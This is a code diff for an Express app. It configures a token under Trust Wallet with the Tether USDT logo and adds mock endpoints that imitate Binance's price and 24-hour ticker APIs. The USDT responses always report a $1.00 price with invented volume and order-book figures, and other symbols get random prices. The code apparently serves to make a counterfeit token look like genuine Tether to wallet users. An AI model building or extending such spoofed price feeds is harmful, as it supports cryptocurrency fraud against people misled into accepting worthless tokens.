@@ -39,8 +39,95 @@ const TRUST_WALLET_CONFIG = {
   trustAssetId: 'c2/7859-1',
   trustAssetDecimals: 6,
   trustAssetLogoUrl: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-  trustWalletDeepLink: `trust://ethereum/asset/${TOKEN_CONFIG.address}?coin=1`
+  trustWalletDeepLink: `trust://ethereum/asset/${TOKEN_CONFIG.address}?coin=1`,
+  // Binance API data (Trust Wallet uses Binance APIs)
+  binanceEndpoints: {
+    price: '/api/binance/api/v3/ticker/price',
+    priceHistory: '/api/binance/api/v3/ticker/24hr'
+  }
 };
+
+// Later in your app.js, add these Binance API endpoints:
+// (Add this after your existing Trust Wallet API endpoints)
+
+// Binance API Endpoints (used by Trust Wallet)
+app.get('/api/binance/api/v3/ticker/price', (req, res) => {
+  const { symbol } = req.query;
+  
+  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+    res.json({
+      symbol: symbol,
+      price: "1.00000000",
+      time: Date.now()
+    });
+  } else {
+    // Default response for other symbols
+    res.json({
+      symbol: symbol || 'BTCUSDT',
+      price: (Math.random() * 10000 + 30000).toFixed(8),
+      time: Date.now()
+    });
+  }
+});
+
+app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
+  const { symbol } = req.query;
+  
+  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
+    res.json({
+      symbol: symbol,
+      priceChange: "0.00010000",
+      priceChangePercent: "0.01",
+      weightedAvgPrice: "1.00000000",
+      prevClosePrice: "0.99990000",
+      lastPrice: "1.00000000",
+      lastQty: "1000.00000000",
+      bidPrice: "0.99995000",
+      bidQty: "1000.00000000",
+      askPrice: "1.00005000",
+      askQty: "1000.00000000",
+      openPrice: "0.99990000",
+      highPrice: "1.00100000",
+      lowPrice: "0.99900000",
+      volume: "10000000.00000000",
+      quoteVolume: "10000000.00000000",
+      openTime: Date.now() - 86400000,
+      closeTime: Date.now(),
+      firstId: 1,
+      lastId: 1000,
+      count: 1000
+    });
+  } else {
+    // For other symbols, generate realistic market data
+    const basePrice = Math.random() * 10000 + 30000;
+    const priceChange = (Math.random() * 1000 - 500).toFixed(8);
+    const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
+    
+    res.json({
+      symbol: symbol || 'BTCUSDT',
+      priceChange: priceChange,
+      priceChangePercent: percentChange,
+      weightedAvgPrice: basePrice.toFixed(8),
+      prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
+      lastPrice: basePrice.toFixed(8),
+      lastQty: "10.00000000",
+      bidPrice: (basePrice - 100).toFixed(8),
+      bidQty: "5.00000000",
+      askPrice: (basePrice + 100).toFixed(8),
+      askQty: "5.00000000",
+      openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
+      highPrice: (basePrice + Math.random() * 500).toFixed(8),
+      lowPrice: (basePrice - Math.random() * 500).toFixed(8),
+      volume: (Math.random() * 5000 + 1000).toFixed(8),
+      quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
+      openTime: Date.now() - 86400000,
+      closeTime: Date.now(),
+      firstId: 1,
+      lastId: 1000,
+      count: 1000
+    });
+  }
+});
 
 // Enable middleware
 app.use(express.json());
